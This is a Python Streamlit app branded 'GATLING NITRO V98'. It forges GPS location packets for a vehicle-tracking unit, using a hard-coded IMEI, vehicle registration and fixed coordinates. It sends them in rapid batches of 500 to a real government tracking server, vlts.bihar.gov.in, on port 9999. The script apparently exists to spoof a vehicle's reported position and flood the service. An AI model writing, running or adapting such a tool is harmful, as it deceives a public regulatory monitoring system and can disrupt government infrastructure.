import streamlit as st
import socket
import time
from datetime import datetime
import requests

# --- Page Config ---
st.set_page_config(page_title="GATLING NITRO V98", page_icon="🚀", layout="wide")

st.markdown("<style>.main { background-color: #000; color: #0f0; }</style>", unsafe_allow_html=True)

st.title("🚀 VLTS GATLING NITRO - V98")
st.caption("Clean Engine - No Chrome Mode")

# --- States ---
if 'firing' not in st.session_state: st.session_state.firing = False
if 'total_count' not in st.session_state: st.session_state.total_count = 0
if 'last_portal' not in st.session_state: st.session_state.last_portal = "Waiting..."

# --- Sidebar ---
with st.sidebar:
    tag = st.text_input("TAG", "EGAS")
    imei = st.text_input("IMEI", "862567075041793")
    vno = st.text_input("VEHICLE NO", "BR04GA5974")
    lat = st.text_input("LATITUDE", "25.6501550")
    lon = st.text_input("LONGITUDE", "84.7851780")
    mode = st.radio("PROTOCOL", ["UDP", "TCP"])

# --- Buttons ---
c1, c2 = st.columns(2)
if c1.button("🔥 START ENGINE"):
    st.session_state.firing = True
    st.rerun()
if c2.button("🛑 STOP & RESET"):
    st.session_state.firing = False
    st.session_state.total_count = 0
    st.rerun()

st.divider()
m1 = st.empty(); m2 = st.empty()

# --- Execution ---
if st.session_state.firing:
    target = ("vlts.bihar.gov.in", 9999)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if mode == "UDP" else socket.SOCK_STREAM)
    if mode == "TCP":
        sock.settimeout(2); sock.connect(target)
        
    while st.session_state.firing:
        now = datetime.now()
        packet = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*".encode('ascii')
        
        # Super Fast Batch
        for _ in range(500):
            sock.sendto(packet, target) if mode == "UDP" else sock.send(packet)
            st.session_state.total_count += 1
            
        m1.metric("Total Packets Sent", f"{st.session_state.total_count:,}")
        m2.metric("Latest Portal Update", st.session_state.last_portal)
        
        time.sleep(0.1) # UI stability
    sock.close()
